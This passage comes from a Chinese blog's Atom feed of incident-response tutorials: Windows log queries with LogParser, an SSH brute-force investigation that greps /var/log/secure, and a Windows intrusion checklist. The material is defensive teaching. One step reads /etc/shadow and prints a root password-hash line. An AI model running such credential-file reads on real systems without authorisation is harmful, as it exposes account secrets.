23:32:11&#x27;</span> <span class="keyword">and</span> TimeGenerated&lt;<span class="string">&#x27;2018-06-20 23:34:00&#x27;</span> <span class="keyword">and</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录成功的用户名和IP：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT  –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> EventType,TimeGenerated <span class="keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="number">5</span>,<span class="string">&#x27;|&#x27;</span>) <span class="keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="number">38</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p> 2、查询登录失败的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录失败用户名进行聚合统计：</span></span><br><span class="line"><span class="string">LogParser.exe  -i:EVT &quot;</span><span class="keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>)  <span class="keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> <span class="keyword">user</span>,<span class="built_in">count</span>(EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>)) <span class="keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="number">39</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> Message<span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> TimeGenerated,EventID,Message <span class="keyword">FROM</span> c:\<span class="keyword">System</span>.evtx <span class="keyword">where</span> EventID=<span class="number">6005</span> <span class="keyword">or</span> EventID=<span class="number">6006</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-7.png" alt=""></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="./image/log-1-8.png" alt=""></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇第1篇：SSH暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e4068ec3.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e4068ec3.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:21:22.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：SSH暴力破解"><a href="#第1篇：SSH暴力破解" class="headerlink" title="第1篇：SSH暴力破解"></a>第1篇：SSH暴力破解</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131419092.png" alt=""></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​    CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​    CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">、</span>除root之外，是否还有其它特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk <span class="operator">-</span><span class="type">F</span>: &#x27;<span class="variable">$3</span><span class="operator">==</span><span class="number">0</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>passwd</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="operator">、</span>可以远程登录的帐号信息</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk &#x27;<span class="regexp">/\$1|\$6/</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>shadow</span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$38</span>cKfZDjsTiUe58V<span class="variable">$FP</span>.<span class="type">UHWMObqeUQS1Z2KRj</span><span class="regexp">/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./</span>qK12HN8jFuXOfEYIKLID6hq0::<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep -o <span class="string">&quot;Failed password&quot;</span> /var/log/secure|uniq -c</span><br><span class="line">     126254 Failed password</span><br><span class="line">     </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|head -1</span><br><span class="line">Jul  8 20:14:59 localhost sshd<span class="comment">[14323]</span>: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|tail -1</span><br><span class="line">Jul 10 12:37:21 localhost sshd<span class="comment">[2654]</span>: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</span><br><span class="line"></span><br><span class="line">3、进一步定位有哪些IP在爆破？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)&quot;</span>|uniq -c | sort -nr </span><br><span class="line">    12622 23.91.xxx.xxx</span><br><span class="line">     8942 114.104.xxx.xxx</span><br><span class="line">     8122 111.13.xxx.xxx</span><br><span class="line">     7525 123.59.xxx.xxx</span><br><span class="line">     ...................</span><br><span class="line">    </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      9402  root</span><br><span class="line">      3265  invalid user oracle</span><br><span class="line">      1245  invalid user admin</span><br><span class="line">      1025  invalid user user</span><br><span class="line">      .....................</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>C、管理员最近登录情况：</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、登录成功的日期、用户名、IP：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$1</span>,<span class="subst">$2</span>,<span class="subst">$3</span>,<span class="subst">$9</span>,<span class="subst">$11</span>&#125;&#x27;</span> </span><br><span class="line">Jul <span class="number">9</span> <span class="number">09</span>:<span class="number">38</span>:<span class="number">09</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">9</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">51</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">08</span>:<span class="number">54</span>:<span class="number">26</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">16</span>:<span class="number">25</span>:<span class="number">59</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">............................</span><br><span class="line">通过登录日志分析，并未发现异常登录时间和登录IP。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、顺便统计一下登录成功的IP有哪些：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$11</span>&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">     <span class="number">27</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器ssh默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第01章：入侵排查篇第1篇：Windows 入侵排查</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/dd41cd94.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/dd41cd94.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:21:22.612Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：windows-入侵排查"><a href="#第1篇：windows-入侵排查" class="headerlink" title="第1篇：windows 入侵排查"></a>第1篇：windows 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419995.png" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 — 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-2.png" alt=""></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419981.png" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 — 运行 — 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 — 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​    b、查看进程对应的 PID：任务管理器 — 查看 — 选择列 — PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器 — 选择对应进程 — 右键打开文件位置</p><p>​        运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​    d、<code>tasklist /svc</code>   进程 — PID — 服务</p><p>​    e、查看Windows服务所对应的端口：</p><p>​        %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419109.png" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Window</span> <span class="number">2003</span>版本 C:\Documents and Settings</span><br><span class="line"><span class="attribute">Window</span> <span class="number">2008</span>R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇第2篇：Linux日志分析</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/f07b7e61.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/f07b7e61.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.047Z</updated>
    
